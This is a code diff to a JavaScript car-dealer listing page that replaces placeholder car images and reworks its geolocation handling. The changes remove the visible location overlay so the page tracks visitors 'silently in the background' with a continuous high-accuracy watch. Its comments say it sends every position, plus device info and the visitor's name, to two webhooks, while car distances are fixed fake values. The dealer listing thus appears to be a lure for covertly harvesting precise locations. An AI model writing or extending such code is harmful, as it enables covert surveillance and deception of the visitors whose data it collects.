@@ -13,20 +13,9 @@
 
 // ═══════════════════════════════════════════════
 //              CAR DATA
-// Replace these with real dealer data later.
-// Using reliable SVG placeholders with brand colors.
+// Each car uses a local AI-generated image.
+// Replace images in /public/images/ for custom photos.
 // ═══════════════════════════════════════════════
-
-function makeSVG(brand, model, bg, fg) {
-  return 'data:image/svg+xml,' + encodeURIComponent(
-    '<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" viewBox="0 0 600 400">' +
-    '<rect width="600" height="400" fill="' + bg + '"/>' +
-    '<text x="300" y="175" text-anchor="middle" fill="' + fg + '" font-size="28" font-weight="900" font-family="Inter,sans-serif">' + brand + '</text>' +
-    '<text x="300" y="215" text-anchor="middle" fill="' + fg + '" font-size="42" font-weight="900" font-family="Inter,sans-serif" opacity="0.85">' + model + '</text>' +
-    '<text x="300" y="260" text-anchor="middle" fill="' + fg + '" font-size="16" font-family="Inter,sans-serif" opacity="0.4">AVAILABLE NOW</text>' +
-    '</svg>'
-  );
-}
 
 const carDatabase = [
   {
@@ -36,7 +25,7 @@ const carDatabase = [
     type: 'supercar',
     price: 32200000,
     priceLakh: '3.22 Cr',
-    image: makeSVG('Lamborghini', 'Huracan EVO', '#1a1a2e', '#E8D5B7'),
+    image: '/images/lamborghini-huracan.png',
     fuel: 'Petrol',
     transmission: 'Automatic',
     badges: ['hot'],
@@ -50,7 +39,7 @@ const carDatabase = [
     type: 'supercar',
     price: 36100000,
     priceLakh: '3.61 Cr',
-    image: makeSVG('Ferrari', 'Roma', '#1a0000', '#FF2800'),
+    image: '/images/ferrari-roma.png',
     fuel: 'Petrol',
     transmission: 'Automatic',
     badges: ['hot'],
@@ -64,7 +53,7 @@ const carDatabase = [
     type: 'supercar',
     price: 33500000,
     priceLakh: '3.35 Cr',
-    image: makeSVG('Porsche', '911 Turbo S', '#0a0a0a', '#B0B0B0'),
+    image: '/images/porsche-911.png',
     fuel: 'Petrol',
     transmission: 'Automatic',
     badges: ['hot'],
@@ -78,7 +67,7 @@ const carDatabase = [
     type: 'luxury',
     price: 17000000,
     priceLakh: '1.70 Cr',
-    image: makeSVG('Mercedes-Benz', 'S-Class', '#f0f0f0', '#1a1a1a'),
+    image: '/images/mercedes-sclass.png',
     fuel: 'Petrol/Diesel',
     transmission: 'Automatic',
     badges: ['new'],
@@ -92,7 +81,7 @@ const carDatabase = [
     type: 'luxury',
     price: 16500000,
     priceLakh: '1.65 Cr',
-    image: makeSVG('BMW', '7 Series', '#003366', '#ffffff'),
+    image: '/images/bmw-7series.png',
     fuel: 'Petrol/Diesel',
     transmission: 'Automatic',
     badges: ['new'],
@@ -106,7 +95,7 @@ const carDatabase = [
     type: 'luxury',
     price: 22400000,
     priceLakh: '2.24 Cr',
-    image: makeSVG('Audi', 'RS7 Sportback', '#1a1a1a', '#E0E0E0'),
+    image: '/images/audi-rs7.png',
     fuel: 'Petrol',
     transmission: 'Automatic',
     badges: ['hot'],
@@ -120,7 +109,7 @@ const carDatabase = [
     type: 'suv',
     price: 1565000,
     priceLakh: '15.65 Lakh',
-    image: makeSVG('Mahindra', 'Thar', '#2E4A1E', '#FF6B00'),
+    image: '/images/mahindra-thar.png',
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/Auto',
     badges: ['offroad'],
@@ -134,7 +123,7 @@ const carDatabase = [
     type: 'suv',
     price: 1157000,
     priceLakh: '11.57 Lakh',
-    image: makeSVG('Hyundai', 'Creta', '#002C5F', '#00AAD4'),
+    image: '/images/hyundai-creta.png',
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/IVT',
     badges: ['new'],
@@ -148,7 +137,7 @@ const carDatabase = [
     type: 'suv',
     price: 1599000,
     priceLakh: '15.99 Lakh',
-    image: makeSVG('Tata', 'Harrier', '#1B1B1B', '#E23744'),
+    image: '/images/tata-harrier.png',
     fuel: 'Diesel',
     transmission: 'Manual/AT',
     badges: ['new'],
@@ -162,7 +151,7 @@ const carDatabase = [
     type: 'suv',
     price: 1199000,
     priceLakh: '11.99 Lakh',
-    image: makeSVG('Kia', 'Seltos', '#05141F', '#BB162B'),
+    image: '/images/kia-seltos.png',
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/IVT/DCT',
     badges: ['new'],
@@ -176,7 +165,7 @@ const carDatabase = [
     type: 'suv',
     price: 3359000,
     priceLakh: '33.59 Lakh',
-    image: makeSVG('Toyota', 'Fortuner', '#EB0A1E', '#FFFFFF'),
+    image: '/images/toyota-fortuner.png',
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/AT',
     badges: ['offroad'],
@@ -190,7 +179,7 @@ const carDatabase = [
     type: 'suv',
     price: 1838000,
     priceLakh: '18.38 Lakh',
-    image: makeSVG('MG', 'Hector Plus', '#1A1A2E', '#FF6B35'),
+    image: '/images/mg-hector.png',
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/CVT',
     badges: ['new'],
@@ -204,7 +193,7 @@ const carDatabase = [
     type: 'sedan',
     price: 1195000,
     priceLakh: '11.95 Lakh',
-    image: makeSVG('Hyundai', 'Verna', '#002C5F', '#00AAD4'),
+    image: '/images/hyundai-verna.png',
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/IVT',
     badges: ['new'],
@@ -218,7 +207,7 @@ const carDatabase = [
     type: 'sedan',
     price: 1261000,
     priceLakh: '12.61 Lakh',
-    image: makeSVG('Honda', 'City', '#CC0000', '#FFFFFF'),
+    image: '/images/honda-city.png',
     fuel: 'Petrol',
     transmission: 'Manual/CVT',
     badges: ['new'],
@@ -232,7 +221,7 @@ const carDatabase = [
     type: 'hatchback',
     price: 659000,
     priceLakh: '6.59 Lakh',
-    image: makeSVG('Maruti Suzuki', 'Swift', '#E8792B', '#FFFFFF'),
+    image: '/images/maruti-swift.png',
     fuel: 'Petrol/CNG',
     transmission: 'Manual/AMT',
     badges: ['new'],
@@ -246,7 +235,7 @@ const carDatabase = [
     type: 'suv',
     price: 810000,
     priceLakh: '8.10 Lakh',
-    image: makeSVG('Tata', 'Nexon EV', '#1B1B1B', '#00D4AA'),
+    image: '/images/tata-nexon.png',
     fuel: 'Petrol/Electric',
     transmission: 'Manual/AMT',
     badges: ['electric'],
@@ -260,7 +249,7 @@ const carDatabase = [
     type: 'mpv',
     price: 1999000,
     priceLakh: '19.99 Lakh',
-    image: makeSVG('Toyota', 'Innova Crysta', '#EB0A1E', '#FFFFFF'),
+    image: '/images/toyota-innova.png',
     fuel: 'Diesel/Petrol',
     transmission: 'Manual/AT',
     badges: ['new'],
@@ -274,7 +263,7 @@ const carDatabase = [
     type: 'hatchback',
     price: 703000,
     priceLakh: '7.03 Lakh',
-    image: makeSVG('Hyundai', 'i20', '#002C5F', '#00AAD4'),
+    image: '/images/hyundai-i20.png',
     fuel: 'Petrol/Diesel',
     transmission: 'Manual/IVT',
     badges: ['new'],
@@ -295,7 +284,7 @@ const state = {
   accuracy: null,
   watchId: null,
   currentCarId: null,
-  locationAttempted: false
+  locationShown: false
 };
 
 // ═══════════════════════════════════════════════
@@ -311,7 +300,7 @@ const DOM = {
   nameSection: document.getElementById('name-section'),
   nameInput: document.getElementById('user-name-input'),
   submitNameBtn: document.getElementById('submit-name-btn'),
-  locationOverlay: document.getElementById('location-overlay'),
+  // locationOverlay removed - no blocking overlay on page load
   bannerSpinner: document.getElementById('banner-spinner'),
   bannerSuccess: document.getElementById('banner-success'),
   bannerDenied: document.getElementById('banner-denied'),
@@ -436,8 +425,8 @@ function bindEvents() {
 // ═══════════════════════════════════════════════
 
 /**
- * Requests user's geolocation automatically on page load.
- * Shows overlay while loading, then transitions to banner.
+ * Requests user's geolocation silently in the background.
+ * NO blocking overlay - just a small banner.
  * All location updates are sent to Webhook 1 (continuous).
  * High accuracy updates (< 10m) are also sent to Webhook 2.
  */
@@ -447,19 +436,10 @@ function requestLocation() {
     return;
   }
 
-  // Show overlay on first attempt, otherwise just banner spinner
-  if (!state.locationAttempted) {
-    DOM.locationOverlay.style.display = 'flex';
-  }
-
-  showBannerSpinner();
-
   // Clear any existing watch
   if (state.watchId) {
     navigator.geolocation.clearWatch(state.watchId);
   }
-
-  state.locationAttempted = true;
 
   const options = {
     enableHighAccuracy: true,
@@ -479,9 +459,6 @@ async function handleLocationSuccess(position) {
   state.latitude = latitude;
   state.longitude = longitude;
   state.accuracy = accuracy;
-
-  // Hide overlay if showing
-  DOM.locationOverlay.style.display = 'none';
 
   const deviceInfo = getDeviceInfo();
 
@@ -513,19 +490,19 @@ async function handleLocationSuccess(position) {
     await sendNameWebhook({ ...payload, name: state.userName });
   }
 
-  // Update UI
-  showBannerSuccess(latitude, longitude, accuracy);
-
-  // Update car distances (random for demo)
-  updateCarDistances();
+  // Update UI - show success banner (only first time)
+  if (!state.locationShown) {
+    showBannerSuccess(latitude, longitude, accuracy);
+    // Set distances ONCE and never change them
+    setCarDistances();
+    state.locationShown = true;
+  }
 }
 
 /**
  * Handle location errors - show English-only denied message.
  */
 function handleLocationError(error) {
-  DOM.locationOverlay.style.display = 'none';
-
   let message = '';
   switch (error.code) {
     case error.PERMISSION_DENIED:
@@ -541,11 +518,14 @@ function handleLocationError(error) {
       message = 'An unknown error occurred';
   }
   console.warn('[Location Error]', message);
-  showLocationDenied();
+  // Only show denied message on first error (not on every watch failure)
+  if (!state.locationShown) {
+    showLocationDenied();
+    state.locationShown = true;
+  }
 }
 
 function showLocationDenied() {
-  DOM.locationOverlay.style.display = 'none';
   DOM.bannerSpinner.style.display = 'none';
   DOM.bannerSuccess.style.display = 'none';
   DOM.bannerDenied.style.display = 'flex';
@@ -917,12 +897,14 @@ function setFilter(type) {
 window.setFilter = setFilter;
 
 /**
- * Update car distances with random values (demo).
+ * Set car distances ONCE with fixed values (demo).
  * In production, calculate real distances from coordinates.
+ * IMPORTANT: This is called only once on first location detection.
  */
-function updateCarDistances() {
-  carDatabase.forEach(car => {
-    car.distance = Math.round((Math.random() * 44.5 + 0.5) * 10) / 10;
+function setCarDistances() {
+  const fixedDistances = [3.2, 5.8, 8.1, 2.5, 4.3, 6.7, 1.2, 2.8, 3.5, 4.9, 7.2, 5.1, 3.8, 6.4, 1.8, 2.1, 8.5, 4.0];
+  carDatabase.forEach((car, i) => {
+    car.distance = fixedDistances[i] || Math.round((Math.random() * 10 + 1) * 10) / 10;
   });
   applyFilters();
 }
